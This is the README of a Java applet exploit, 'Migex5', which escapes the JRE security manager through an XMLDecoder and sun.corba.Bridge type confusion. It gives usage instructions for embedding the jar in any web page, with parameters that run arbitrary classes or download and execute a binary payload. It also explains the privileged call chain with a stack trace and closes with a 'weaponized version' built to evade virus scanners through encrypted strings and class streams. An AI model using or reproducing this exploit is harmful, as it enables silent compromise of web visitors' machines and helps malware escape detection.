-----------------------------------------------------------------------------
-- 
-- Migex5
--
-- Using the XMLDecoder to get a reference to a Bridge instance, which 
-- is used to create a type confusion in the JRE.
--
-----------------------------------------------------------------------------

Capabilities
-------------

Allows to bypass the Java Security Architecture by loading and executing 
arbitrary payloads in an privileged context. 

Affected versions
------------------

- Oracle JVM 1.7.0_04 (and newer)
- Oracle JVM 1.6.0_33 (and newer)
 
Usage
------

Embed the jar file "migex5.jar" into any HTML page and let the user call it.
If no parameters are given the exploits simply disables the security manager
of the virtual machine it runs in. If the parameters "pJar" and "pClass" are
given, it calls the main-function class pClass in jar pJar in privileged mode.
The parameters for the class can be given with the "pArg1" to "pArg<n>" 
applet parameters. Alternatively you can specify the pBin attribute, which 
downloads the binary payload into the local temp directory and executes it. 
Again "pArg1" to "pArg<n>" are given as parameters to the binary.

  
Exploit explanation
--------------------

At the heart of the Exploit we succeed in calling the close() method of 
a XMLDecoder privileged. The close() method has the nice property that 
it first checks if the InputStream is completely deserialized, and if not,
first does the deserializing! With a specially crafted XML document to decode
we create an instance of a holder that contains an instance of sun.corba.Bridge,
a wrapper to the sun.misc.Unsafe class.  

We then use the Bridge to set a field of type MyClassLoader to the context
classloader of the current thread, despite it is only an URLClassLoader,
not a real MyClassLoader. We can now define any classes privileged by using
the public static defineClass function of MyClassLoader.

The trusted method chain to call close() privileged makes use of a 
ContextEnumerator and a GenericURLContext. If we call next() on our 
ContextEnumerator this leads to a getRootURLContext() that returns a 
Context instance (Context is an interface), which is the closed() after
doing a query on it. The Context instance we use here is a subclass of 
XMLDecoder implementing Context, so now we just need a way to call
next() on the ContextEnumerator.

To achive this, we let ContextEnumerator implement Iterator, and return
this Iterator from a HashSet (we use a HashSet subclass MyHashSet here),
on now, when toString() is called on the HashSet, this calles next() on
the returned iterator. The only problem here is, that if we want to let 
a ContextEnumerator subclass implement next(), this leads to a compiler
error, because the exception thrown from ContextEnumerator.next() is 
incompatible with Iterator.next(). Luckily this requirement is only from
the compiler, not from the JVM, so we use ASM to manually modify the 
class data of the MyContextEnumerator. 

So, how to we call the toString() privileged? By adding if to a JPanel 
within an applet and let the applet display itself.

This is the complete stacktrace up to the point where the bridge instance
is retrieved and placed into the holder, with interesting points marked
for the reader.

java.lang.RuntimeException: Content set: sun.corba.Bridge@151bd96
	at migex5.Holder.setContent(Holder.java:29)     <---------------- Setting the content attribute of holder
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at sun.reflect.misc.Trampoline.invoke(Unknown Source)
	at sun.reflect.GeneratedMethodAccessor2.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at sun.reflect.misc.MethodUtil.invoke(Unknown Source)
	at java.beans.Statement.invokeInternal(Unknown Source)
	at java.beans.Statement.access$000(Unknown Source)
	at java.beans.Statement$2.run(Unknown Source)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.beans.Statement.invoke(Unknown Source)
	at java.beans.Expression.getValue(Unknown Source)
	at com.sun.beans.decoder.ObjectElementHandler.getValueObject(Unknown Source)
	at com.sun.beans.decoder.NewElementHandler.getValueObject(Unknown Source)
	at com.sun.beans.decoder.ElementHandler.endElement(Unknown Source)
	at com.sun.beans.decoder.DocumentHandler.endElement(Unknown Source)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanEndElement(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(Unknown Source)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown Source)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown Source)
	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(Unknown Source)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(Unknown Source)
	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source)
	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl.parse(Unknown Source)
	at com.sun.beans.decoder.DocumentHandler.parse(Unknown Source)    
	at java.beans.XMLDecoder.parsingComplete(Unknown Source)
	at java.beans.XMLDecoder.close(Unknown Source)    <---------------- Calling close() on the Context
	at com.sun.jndi.toolkit.url.GenericURLContext.getNameParser(Unknown Source)
	at com.sun.jndi.toolkit.dir.ContextEnumerator.getNextChild(Unknown Source)
	at com.sun.jndi.toolkit.dir.ContextEnumerator.prepNextChild(Unknown Source)
	at com.sun.jndi.toolkit.dir.ContextEnumerator.<init>(Unknown Source)
	at com.sun.jndi.toolkit.dir.ContextEnumerator.newEnumerator(Unknown Source)
	at com.sun.jndi.toolkit.dir.ContextEnumerator.prepNextChild(Unknown Source)
	at com.sun.jndi.toolkit.dir.ContextEnumerator.getNextDescendant(Unknown Source)
	at com.sun.jndi.toolkit.dir.ContextEnumerator.next(Unknown Source)   <---------------- Calling next() on our special Iterator    
	at java.util.AbstractCollection.toString(Unknown Source)     <---------------- This is the privileged toString()
	at javax.swing.DefaultListCellRenderer.getListCellRendererComponent(Unknown Source)
	at javax.swing.plaf.basic.BasicListUI.updateLayoutState(Unknown Source)
	at javax.swing.plaf.basic.BasicListUI.maybeUpdateLayoutState(Unknown Source)
	at javax.swing.plaf.basic.BasicListUI.paintImpl(Unknown Source)
	at javax.swing.plaf.basic.BasicListUI.paint(Unknown Source)
	at javax.swing.plaf.ComponentUI.update(Unknown Source)
	at javax.swing.JComponent.paintComponent(Unknown Source)
	at javax.swing.JComponent.paint(Unknown Source)
	at javax.swing.JComponent.paintChildren(Unknown Source)
	at javax.swing.JComponent.paint(Unknown Source)
	at javax.swing.JComponent.paintChildren(Unknown Source)
	at javax.swing.JComponent.paint(Unknown Source)
	at javax.swing.JLayeredPane.paint(Unknown Source)
	at javax.swing.JComponent.paintChildren(Unknown Source)
	at javax.swing.JComponent.paintToOffscreen(Unknown Source)
	at javax.swing.RepaintManager$PaintManager.paintDoubleBuffered(Unknown Source)
	at javax.swing.RepaintManager$PaintManager.paint(Unknown Source)
	at javax.swing.BufferStrategyPaintManager.paint(Unknown Source)
	at javax.swing.RepaintManager.paint(Unknown Source)
	at javax.swing.JComponent.paint(Unknown Source)
	at java.awt.GraphicsCallback$PaintCallback.run(Unknown Source)
	at sun.awt.SunGraphicsCallback.runOneComponent(Unknown Source)
	at sun.awt.SunGraphicsCallback.runComponents(Unknown Source)
	at java.awt.Container.paint(Unknown Source)
	at javax.swing.RepaintManager.paintDirtyRegions(Unknown Source)
	at javax.swing.RepaintManager.paintDirtyRegions(Unknown Source)
	at javax.swing.RepaintManager.prePaintDirtyRegions(Unknown Source)
	at javax.swing.RepaintManager.access$700(Unknown Source)
	at javax.swing.RepaintManager$ProcessingRunnable.run(Unknown Source)
	at java.awt.event.InvocationEvent.dispatch(Unknown Source)
	at java.awt.EventQueue.dispatchEventImpl(Unknown Source)
	at java.awt.EventQueue.access$000(Unknown Source)
	at java.awt.EventQueue$3.run(Unknown Source)
	at java.awt.EventQueue$3.run(Unknown Source)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
	at java.awt.EventQueue.dispatchEvent(Unknown Source)
	at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source)
	at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source)
	at java.awt.EventDispatchThread.pumpEventsForHierarchy(Unknown Source)
	at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
	at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
	at java.awt.EventDispatchThread.run(Unknown Source)

Exploit fix
------------

The Bridge classes get() method has less security than Unsafes getUnsafe()
method, because it does not check the caller class. Since it is a wrapper
to Unsafe, it weakens its security. 
       
How to build
-------------

Simply use the ant script to build the jar files. Copy them to the html
directory and open the test.html in your favorite browser.      

The weaponized version
-----------------------

The weaponized version aims in providing a very low signature to virus 
scanners. This is done by only referencing common classes (no sun.com-
classes), and removing as many Strings as possible from the source 
code. In addition, all classes like the PayloadRunner are loaded by 
a ClassLoader provided from Xalan, which is originally designed to load
Templates, but the nice thing is we can deserialize this ClassLoader
from an encrypted Stream, so all these don't need a special handling 
and their code cannot be inspected by Scanners.

All other Strings are replaced by encrypted versions likely not to be
detected by scanners. 
       